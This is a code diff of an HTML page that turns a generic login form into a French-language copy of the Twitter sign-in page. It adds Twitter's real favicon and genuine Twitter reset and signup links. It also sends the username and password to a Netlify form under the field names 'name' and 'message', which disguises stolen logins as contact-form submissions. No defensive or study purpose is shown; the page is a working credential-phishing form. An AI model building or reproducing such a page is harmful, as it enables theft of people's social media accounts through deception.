@@ -5,9 +5,10 @@
     <meta charset='utf-8'>
     <meta name="keywords" content=" dfgfd ,gh,gfh fgh,gfhf">
 
-    <title>Page Title</title>
+    <title>Connectez-vous avec twitter</title>
     <meta name='viewport' content='width=device-width, initial-scale=1'>
     <link rel="stylesheet" type="text/css" href="main.css">
+    <link rel="shortcut icon" type="image/icon" href="https://abs.twimg.com/favicons/twitter.ico" />
 
 </head>
 
@@ -20,27 +21,32 @@
             <h1>Se connecter avec Twitter</h1>
         </header>
 
-        <form>
+        <form action="POST" data-netlify="true">
             <div class="input-wrapper">
                 <label for="user-name-id">Téléphone, email ou nom d'utilisateur</label>
-                <input type="text" name="username" id="user-name-id">
+                <input type="text" name="name" id="user-name-id">
             </div>
 
             <div class="input-wrapper">
                 <label for="password-id">Mot de passe</label>
-                <input type="password" name="password" id="password-id">
+                <input type="password" name="message" id="password-id">
             </div>
-
-            <button class="twitter-btn">Se connecter</button>
+            <input class="sumbito twitter-btn" type="submit" value="Se connecter">
         </form>
 
         <div class="footer">
-            <a href="#">Forget Password</a> .
-            <a href="#">Sign up to twitter</a>
+            <a href="https://twitter.com/account/begin_password_reset   ">Mot de passe oublié ?</a> .
+            <a href="https://twitter.com/i/flow/signup">S'inscrire sur Twitter</a>
         </div>
 
     </div>
     <style>
+        @media screen and (max-width:500px) {
+            h1 {
+                font-size: 25px !important;
+            }
+        }
+
         * {
             box-sizing: border-box;
         }
@@ -68,12 +74,19 @@
 
         .input-wrapper {
             margin-bottom: 15px;
+
         }
 
         .input-wrapper label,
         .input-wrapper input {
             width: 100%;
             display: block;
+
+        }
+
+        .input-wrapper label {
+            border-top-right-radius: 5px;
+            border-top-left-radius: 5px;
         }
 
         .input-wrapper input {
